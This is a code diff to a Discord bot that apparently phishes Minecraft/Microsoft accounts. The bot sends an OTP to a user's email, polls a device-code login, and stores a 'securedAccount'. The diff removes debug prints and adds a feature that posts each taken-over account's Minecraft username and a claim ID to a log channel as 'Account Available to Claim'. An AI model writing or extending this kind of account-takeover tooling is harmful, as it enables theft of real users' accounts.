@@ -85,7 +85,6 @@ class MyModalOne(ui.Modal):
 
         # Sends OTP/Auth code
         emailInfo = await sendAuth(self.session, email)
-        print(emailInfo)
 
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
         if "Credentials" not in emailInfo:
@@ -162,8 +161,6 @@ class MyModalOne(ui.Modal):
             while i < 60:
 
                 data = await checkCode(device)
-                print(data)
-
                 if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
 
                     await interaction.followup.send(
@@ -256,6 +253,17 @@ class MyModalOne(ui.Modal):
                             securedAccount["details"]
                         )
                     )
+
+                    if config["claims"]["claims_enabled"]:
+                        mc_name = securedAccount["minecraft"]["name"]
+                        await sendLogs(
+                            interaction.client, config,
+                            Embed(
+                                title="Account Available to Claim",
+                                description=f"**MC Username:** `{mc_name}`\n**Claim ID:** `{securedAccount['claim_id']}`",
+                                color=0x79D990
+                            )
+                        )
 
                     return
 
